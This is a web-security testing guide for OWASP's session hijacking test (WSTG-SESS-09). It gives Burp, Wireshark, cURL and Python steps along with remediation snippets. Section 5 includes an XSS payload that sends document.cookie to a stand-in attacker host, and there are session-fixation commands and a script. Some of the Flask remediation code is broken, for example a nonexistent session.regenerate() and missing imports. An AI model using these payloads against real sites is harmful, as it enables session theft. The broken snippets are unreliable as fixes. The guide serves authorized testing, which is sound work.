# **Testing for Session Hijacking**

## **Overview**

Testing for Session Hijacking (WSTG-SESS-09) involves assessing a web application to ensure that session identifiers are securely generated, transmitted, and stored, preventing attackers from stealing or misusing them to impersonate users. According to OWASP, session hijacking vulnerabilities allow attackers to gain unauthorized access to user sessions, potentially compromising sensitive data or functionality. This test focuses on verifying session ID security, transmission encryption, and invalidation mechanisms to mitigate hijacking risks.

**Impact**: Session hijacking vulnerabilities can lead to:
- Unauthorized access to user accounts, enabling actions like data theft or account changes.
- Privilege escalation if admin or privileged sessions are hijacked.
- Data exposure or financial loss in sensitive applications.
- Reputational damage from compromised user sessions.

This guide provides a practical, hands-on methodology for testing session hijacking, adhering to OWASP’s WSTG-SESS-09, with detailed tool setups, at least two specific commands or configurations per tool, real-world test cases, remediation strategies, and ethical considerations for professional penetration testing.

## **Testing Tools**

The following tools are recommended for testing session hijacking, with at least two specific commands or configurations per tool for real security testing:

- **Burp Suite Community Edition**: Intercepts requests and analyzes session ID randomness.
- **Wireshark**: Captures network traffic to detect unencrypted session IDs.
- **Postman**: Tests session ID behavior in API endpoints.
- **cURL**: Sends requests to verify session ID exposure or reuse.
- **Browser Developer Tools**: Inspects cookies and client-side session ID exposure.
- **Python Requests Library**: Automates session ID manipulation and hijacking tests.

### **Tool Setup Instructions**

1. **Burp Suite Community Edition**:
   - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
   - Configure browser proxy: 127.0.0.1:8080 (Firefox recommended).
   - Enable “Intercept” in Proxy tab.
   - Verify: `curl -x http://127.0.0.1:8080 http://example.com`.
2. **Wireshark**:
   - Download from [wireshark.org](https://www.wireshark.org/download.html).
   - Install and configure network interface (e.g., Wi-Fi, Ethernet).
   - Verify: `wireshark --version`.
3. **Postman**:
   - Download from [postman.com](https://www.postman.com/downloads/).
   - Install and create a free account.
   - Verify: Open Postman and check version.
4. **cURL**:
   - Install on Linux: `sudo apt install curl`.
   - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
   - Verify: `curl --version`.
5. **Browser Developer Tools**:
   - Access in Chrome/Firefox: Press `F12` or right-click and select “Inspect”.
   - No setup required.
6. **Python Requests Library**:
   - Install Python: `sudo apt install python3`.
   - Install Requests: `pip install requests`.
   - Verify: `python3 -c "import requests; print(requests.__version__)"`.

## **Testing Methodology**

This methodology follows OWASP’s black-box approach for WSTG-SESS-09, focusing on testing session ID exposure, transmission security, session ID strength, session fixation, session reuse, XSS exploitation, and network sniffing.

### **1. Test Session ID Exposure with Burp Suite**

Check if session IDs are exposed in URLs, logs, or client-side code.

**Steps**:
1. **Configure Burp Suite**:
   - Set up browser proxy (127.0.0.1:8080).
   - Add `example.com` to the target scope in the “Target” tab.
2. **Capture Requests**:
   - Log in and navigate the application, checking “HTTP History” for session IDs in URLs (e.g., `?sessionid=abc123`), cookies, or headers.
3. **Test Exposure**:
   - Look for session IDs in referer headers, error messages, or client-side code.
   - Attempt to use an exposed session ID in a new session to access protected resources.
4. **Analyze Findings**:
   - Vulnerable: Session ID exposed and usable.
   - Expected secure response: Session IDs only in secure cookies; URLs clean.
5. **Document Findings**:
   - Save requests and responses in Burp Suite’s “Logger”.

**Burp Suite Commands**:
- **Command 1**: Check for session ID in URL:
  ```
  HTTP History -> Select GET /dashboard -> Request tab -> Look for ?sessionid=abc123
  ```
- **Command 2**: Test exposed session ID:
  ```
  HTTP History -> Select GET /dashboard -> Send to Repeater -> Set Cookie: session=abc123 -> Click Send -> Check response
  ```

**Example Vulnerable Request**:
```
GET /dashboard?sessionid=abc123 HTTP/1.1
Host: example.com
```

**Remediation**:
- Use cookies for session IDs:
  ```javascript
  app.get('/dashboard', (req, res) => {
      if (!req.cookies.session) {
          return res.status(401).json({ error: 'Unauthorized' });
      }
      res.send('Dashboard');
  });
  ```

### **2. Test Transmission Security with Wireshark**

Ensure session IDs are transmitted only over encrypted channels.

**Steps**:
1. **Configure Wireshark**:
   - Start Wireshark and select the network interface (e.g., Wi-Fi).
   - Apply filter: `http` to capture HTTP traffic.
2. **Capture Traffic**:
   - Access the application over HTTP (e.g., `http://example.com/login`) and log in.
   - Check Wireshark for session cookies or IDs in HTTP packets.
3. **Analyze Findings**:
   - Look for `Cookie: session=abc123` in HTTP packets.
   - Vulnerable: Session ID sent over HTTP.
   - Expected secure response: No session data in HTTP; all traffic over HTTPS.
4. **Document Findings**:
   - Save Wireshark packet captures.

**Wireshark Commands**:
- **Command 1**: Filter HTTP traffic:
  ```
  Filter: http -> Apply -> Access http://example.com/login -> Look for Cookie header
  ```
- **Command 2**: Check for session ID:
  ```
  Filter: http.request -> Select packet -> Inspect HTTP -> Look for Cookie: session=abc123
  ```

**Example Vulnerable Packet**:
```
GET /dashboard HTTP/1.1
Host: example.com
Cookie: session=abc123
```

**Remediation**:
- Enforce HTTPS with HSTS:
  ```javascript
  app.use((req, res, next) => {
      res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
      if (!req.secure) {
          return res.redirect(`https://${req.get('host')}${req.url}`);
      }
      next();
  });
  ```

### **3. Test Session ID Strength with Burp Suite Sequencer**

Verify that session IDs are random and unpredictable.

**Steps**:
1. **Configure Burp Suite Sequencer**:
   - Log in multiple times to capture session cookies in “HTTP History”.
   - Select a `Set-Cookie: session=abc123` response and send to Sequencer.
2. **Analyze Randomness**:
   - Run Sequencer to collect 100+ session IDs.
   - Check entropy analysis for predictability (e.g., sequential or timestamp-based IDs).
3. **Test Guessing**:
   - Generate a predicted session ID based on patterns (e.g., incrementing numbers) and test it in Repeater.
4. **Analyze Findings**:
   - Vulnerable: Low entropy or predictable IDs.
   - Expected secure response: High entropy, random IDs.
5. **Document Findings**:
   - Save Sequencer reports.

**Burp Suite Commands**:
- **Command 1**: Send to Sequencer:
  ```
  HTTP History -> Select POST /login -> Response tab -> Right-click Set-Cookie -> Send to Sequencer -> Start Capture
  ```
- **Command 2**: Test predicted ID:
  ```
  HTTP History -> Select GET /dashboard -> Send to Repeater -> Set Cookie: session=abc124 -> Click Send -> Check response
  ```

**Example Vulnerable Session ID**:
```
session=12345 (sequential)
```

**Remediation**:
- Generate random session IDs:
  ```python
  from flask import Flask, session
  import secrets
  app = Flask(__name__)
  @app.post('/login')
  def login():
      session['id'] = secrets.token_urlsafe(32)
      return jsonify({'status': 'success'})
  ```

### **4. Test Session Fixation with cURL**

Check if attackers can force a known session ID on a user.

**Steps**:
1. **Set Known Session ID**:
   - Access the application with a predefined session ID (e.g., `session=attacker123`).
2. **Authenticate**:
   - Log in using the same session ID and check if the server accepts it.
3. **Test Hijacking**:
   - Use the known session ID in another session to access protected resources.
4. **Analyze Findings**:
   - Vulnerable: Known session ID is accepted post-authentication.
   - Expected secure response: New session ID generated on login.
5. **Document Findings**:
   - Save cURL commands and responses.

**cURL Commands**:
- **Command 1**: Set known session ID:
  ```bash
  curl -i -b "session=attacker123" http://example.com/login
  ```
- **Command 2**: Test session after login:
  ```bash
  curl -i -b "session=attacker123" -d "username=test&password=Secure123" -X POST http://example.com/login
  curl -i -b "session=attacker123" http://example.com/dashboard
  ```

**Example Vulnerable Response**:
```
[Post-login GET /dashboard]
HTTP/1.1 200 OK
Dashboard Content
```

**Remediation**:
- Regenerate session ID on login:
  ```javascript
  app.post('/login', (req, res) => {
      req.session.regenerate((err) => {
          if (err) return res.status(500).json({ error: 'Login failed' });
          req.session.user = 'test';
          res.json({ status: 'success' });
      });
  });
  ```

### **5. Test XSS-Based Session Theft with Browser Developer Tools**

Assess if XSS vulnerabilities can steal session IDs.

**Steps**:
1. **Identify XSS Vulnerability**:
   - Test for XSS (e.g., via input fields) using payloads like `<script>alert(document.cookie)</script>`.
2. **Steal Session ID**:
   - Inject a payload to send `document.cookie` to an attacker-controlled server (e.g., `<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>`).
   - Check if the session cookie is accessible (i.e., lacks `HttpOnly`).
3. **Test Hijacking**:
   - Use the stolen session ID to access protected resources.
4. **Analyze Findings**:
   - Vulnerable: Cookie stolen and usable.
   - Expected secure response: `HttpOnly` prevents cookie access.
5. **Document Findings**:
   - Save screenshots and network logs.

**Browser Developer Tools Commands**:
- **Command 1**: Test XSS payload:
  ```
  Console tab -> Run: document.cookie -> Check if session=abc123 is returned
  ```
- **Command 2**: Inject XSS payload:
  ```
  Elements tab -> Edit input field -> Set value to <script>alert(document.cookie)</script> -> Submit form -> Check alert
  ```

**Example Vulnerable Code**:
```html
<script>
var cookie = document.cookie; // Accessible without HttpOnly
</script>
```

**Remediation**:
- Set `HttpOnly` on cookies:
  ```python
  response.set_cookie('session', 'abc123', httponly=True, secure=True, samesite='Strict')
  ```

### **6. Automate Session Hijacking Testing with Python Requests**

Automate testing to detect session ID vulnerabilities.

**Steps**:
1. **Write Python Script**:
   - Create a script to test session ID exposure, fixation, and reuse:
     ```python
     import requests

     base_url = 'http://example.com'
     login_url = f'{base_url}/login'
     dashboard_url = f'{base_url}/dashboard'

     # Test session fixation
     session = requests.Session()
     session.cookies.set('session', 'attacker123')
     response = session.post(login_url, data={'username': 'test', 'password': 'Secure123'})
     response = session.get(dashboard_url)
     print(f"Fixation test: Status={response.status_code}, Response={response.text[:100]}")
     if response.status_code == 200 and 'dashboard' in response.text.lower():
         print("Vulnerable: Session fixation succeeded")

     # Test session ID exposure in URL
     response = session.get(f'{base_url}/dashboard?sessionid=abc123')
     if 'sessionid' in response.url:
         print(f"Vulnerable: Session ID in URL: {response.url}")

     # Test session reuse after logout
     session_cookie = session.cookies.get('session')
     session.post(f'{base_url}/logout')
     response = session.get(dashboard_url, cookies={'session': session_cookie})
     print(f"Reuse test: Status={response.status_code}, Response={response.text[:100]}")
     if response.status_code == 200 and 'dashboard' in response.text.lower():
         print("Vulnerable: Session ID reused after logout")
     ```
2. **Run Script**:
   - Execute: `python3 test_session_hijacking.py`.
   - Analyze output for vulnerabilities.
3. **Verify Findings**:
   - Vulnerable: Session fixation, exposure, or reuse detected.
   - Expected secure response: HTTP 401 or 403 for invalid sessions.
4. **Document Results**:
   - Save script output.

**Python Commands**:
- **Command 1**: Run hijacking test:
  ```bash
  python3 test_session_hijacking.py
  ```
- **Command 2**: Test session fixation:
  ```bash
  python3 -c "import requests; s=requests.Session(); s.cookies.set('session', 'attacker123'); s.post('http://example.com/login', data={'username': 'test', 'password': 'Secure123'}); r=s.get('http://example.com/dashboard'); print(r.status_code, r.text[:100])"
  ```

**Example Vulnerable Output**:
```
Fixation test: Status=200, Response=Dashboard Content
Vulnerable: Session fixation succeeded
Vulnerable: Session ID in URL: http://example.com/dashboard?sessionid=abc123
```

**Remediation**:
- Secure session handling:
  ```python
  from flask import Flask, session
  app = Flask(__name__)
  @app.post('/login')
  def login():
      session.regenerate()  # Prevent fixation
      session['user'] = 'test'
      response = make_response({'status': 'success'})
      response.set_cookie('session', session.sid, httponly=True, secure=True, samesite='Strict')
      return response
  ```

## **Real-World Test Cases**

These test cases extend OWASP’s WSTG-SESS-09 with practical scenarios based on common session hijacking vulnerabilities observed in penetration testing.

### **Test 1: Session ID Exposure in URL**

**Objective**: Verify that session IDs are not exposed in URLs.

**Steps**:
1. **Capture Requests**:
   - Use Burp Suite to intercept navigation.
   - Command:
     ```
     HTTP History -> Select GET /dashboard -> Request tab -> Check for ?sessionid=abc123
     ```
2. **Test Session ID**:
   - Command:
     ```
     HTTP History -> Select GET /dashboard -> Send to Repeater -> Set Cookie: session=abc123 -> Click Send
     ```
3. **Analyze Response**:
   - Check if session ID in URL grants access.
   - Expected secure response: URL parameter ignored.
4. **Save Results**:
   - Save Burp Suite outputs.

**Example Vulnerable Request**:
```
GET /dashboard?sessionid=abc123 HTTP/1.1
```

**Remediation**:
```javascript
if (req.query.sessionid) {
    return res.status(400).json({ error: 'Invalid request' });
}
```

### **Test 2: Unencrypted Transmission**

**Objective**: Ensure session IDs are sent only over HTTPS.

**Steps**:
1. **Capture Traffic**:
   - Use Wireshark with filter `http`.
   - Command:
     ```
     Filter: http -> Apply -> Access http://example.com/dashboard
     ```
2. **Analyze Packet**:
   - Command:
     ```
     Filter: http.request -> Select packet -> Inspect HTTP -> Look for Cookie: session=abc123
     ```
3. **Verify Findings**:
   - Check for session ID in HTTP traffic.
   - Expected secure response: No session data in HTTP.
4. **Save Results**:
   - Save Wireshark captures.

**Example Vulnerable Packet**:
```
Cookie: session=abc123
```

**Remediation**:
```python
if not request.is_secure:
    return redirect(request.url.replace('http://', 'https://'))
```

### **Test 3: Session Fixation**

**Objective**: Verify that session IDs are regenerated on login.

**Steps**:
1. **Set Known ID**:
   - Use cURL:
     ```bash
     curl -i -b "session=attacker123" http://example.com/login
     ```
2. **Log In and Test**:
   - Command:
     ```bash
     curl -i -b "session=attacker123" -d "username=test&password=Secure123" -X POST http://example.com/login
     curl -i -b "session=attacker123" http://example.com/dashboard
     ```
3. **Analyze Response**:
   - Check if known ID grants access.
   - Expected secure response: New session ID.
4. **Save Results**:
   - Save cURL outputs.

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Dashboard Content
```

**Remediation**:
```javascript
req.session.regenerate();
```

### **Test 4: XSS-Based Cookie Theft**

**Objective**: Ensure cookies are protected from XSS theft.

**Steps**:
1. **Test XSS**:
   - Use Browser Developer Tools:
     ```
     Console tab -> Run: document.cookie
     ```
2. **Inject Payload**:
   - Command:
     ```
     Elements tab -> Edit input -> Set value to <script>alert(document.cookie)</script> -> Submit
     ```
3. **Analyze Findings**:
   - Check if cookie is accessible.
   - Expected secure response: `HttpOnly` prevents access.
4. **Save Results**:
   - Save screenshots.

**Example Vulnerable Code**:
```html
<script>var cookie = document.cookie;</script>
```

**Remediation**:
```python
response.set_cookie('session', 'abc123', httponly=True)
```

## **Additional Tips**

- **Test All Vectors**: Check URLs, cookies, headers, and client-side code for session ID vulnerabilities.
- **Combine Tools**: Use Burp Suite for analysis, Wireshark for sniffing, and Python for automation.
- **Gray-Box Testing**: If logs are accessible, verify session ID generation and storage.
- **Document Thoroughly**: Save all commands, responses, and screenshots in a report.
- **Ethical Considerations**: Obtain explicit permission for testing, as session hijacking tests (e.g., network sniffing, XSS) may violate privacy or disrupt services.
- **References**: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html), [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).